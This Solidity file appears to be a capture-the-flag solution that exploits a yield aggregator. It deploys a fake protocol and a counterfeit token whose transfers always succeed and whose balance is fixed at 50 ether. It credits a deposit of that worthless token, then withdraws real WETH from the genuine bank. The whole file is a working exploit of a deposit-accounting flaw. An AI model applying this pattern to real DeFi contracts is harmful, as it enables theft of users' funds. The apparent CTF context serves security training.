pragma solidity ^0.8.6;

import "./Setup.sol";

contract PoisonBank {
    uint256 public totalSupply;

    function mint(uint256 amount) public {
        totalSupply += amount;
    }

    function burn(uint256 amount) public {
        totalSupply -= amount;
    }

    function balanceUnderlying() public view returns (uint256) {
        return totalSupply;
    }

    function rate() public pure returns (uint256) {
        return 1;
    }
}

contract PoisonToken {
    function transfer(address dst, uint256 qty) external returns (bool) {
        return true;
    }

    function transferFrom(
        address src,
        address dst,
        uint256 qty
    ) external returns (bool) {
        return true;
    }

    function balanceOf(address who) external view returns (uint256) {
        return 50 ether;
    }

    function approve(address guy, uint256 wad) external returns (bool) {
        return true;
    }
}


contract DappSolve {
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(Setup _setup) {    
        YieldAggregator ya = _setup.aggregator();
        MiniBank bank = _setup.bank();
        PoisonBank poisonBank = new PoisonBank();
        PoisonToken poisonToken = new PoisonToken();

        address[] memory _tokens = new address[](1);
        _tokens[0] = address(poisonToken);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;

        ya.deposit(Protocol(address(poisonBank)), _tokens, _amounts);

        _tokens[0] = address(weth);
        ya.withdraw(Protocol(address(bank)), _tokens, _amounts);
    }
}
